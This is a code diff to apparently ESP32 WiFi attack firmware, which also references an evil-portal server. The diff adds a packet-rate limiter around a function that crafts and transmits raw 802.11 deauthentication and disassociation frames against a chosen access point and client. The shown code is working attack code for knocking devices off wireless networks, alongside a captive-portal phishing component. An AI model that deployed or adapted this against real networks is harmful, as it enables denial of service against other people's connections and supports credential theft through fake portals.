@@ -36,6 +36,7 @@
 #define CHUNK_SIZE 8192
 #define MDNS_NAME_BUF_LEN 65
 #define ARP_DELAY_MS 500
+#define MAX_PACKETS_PER_SECOND 200
 
 uint16_t ap_count;
 wifi_ap_record_t* scanned_aps;
@@ -50,6 +51,8 @@ httpd_handle_t evilportal_server = NULL;
 dns_server_handle_t dns_handle;
 esp_netif_t* wifiAP;
 esp_netif_t* wifiSTA;
+static uint32_t last_packet_time = 0;
+static uint32_t packet_counter = 0;
 
 struct service_info {
     const char *query;
@@ -1138,6 +1141,25 @@ void wifi_manager_list_stations() {
     }
 }   
 
+static bool check_packet_rate(void) {
+    uint32_t current_time = esp_timer_get_time() / 1000; // Convert to milliseconds
+    
+    // Reset counter every second
+    if (current_time - last_packet_time >= 1000) {
+        packet_counter = 0;
+        last_packet_time = current_time;
+        return true;
+    }
+    
+    // Check if we've exceeded our rate limit
+    if (packet_counter >= MAX_PACKETS_PER_SECOND) {
+        return false;
+    }
+    
+    packet_counter++;
+    return true;
+}
+
 esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t mac[6]) {
     esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     if (err != ESP_OK) {
@@ -1155,7 +1177,7 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
 
     // Add disassociation frame (same structure, different frame type)
     uint8_t disassoc_frame_default[26] = {
-        0xa0, 0x00, 0x3a, 0x01,  // Only first byte different (0xa0 instead of 0xc0)
+        0xa0, 0x00, 0x3a, 0x01,
         0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -1215,11 +1237,19 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
     disassoc_frame_default[20] = bssid[4];
     disassoc_frame_default[21] = bssid[5];
     
-    // Send deauth and disassoc frames in first direction
-    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-    esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
-    esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
+    // Wrap the packet sending with rate limiting
+    if (check_packet_rate()) {
+        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+        }
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
+        }
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
+        }
+    }
 
     // If not broadcast, send packets in opposite direction (Station -> AP)
     if (!is_broadcast) {
@@ -1254,18 +1284,28 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
         disassoc_frame_default[14] = mac[4];
         disassoc_frame_default[15] = mac[5];
 
-        // Send reverse direction packets
-        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-        esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
-        esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
+        // Wrap reverse direction packets with rate limiting
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+        }
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+        }
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
+        }
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_default, sizeof(disassoc_frame_default), false);
+        }
     }
     
     // Final frame with error checking (original direction)
-    err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-    if (err != ESP_OK) {
-        printf("Failed to send beacon frame: %s\n", esp_err_to_name(err));
-        return err;
+    if (check_packet_rate()) {
+        err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+        if (err != ESP_OK) {
+            printf("Failed to send beacon frame: %s\n", esp_err_to_name(err));
+            return err;
+        }
     }
 
     return ESP_OK;
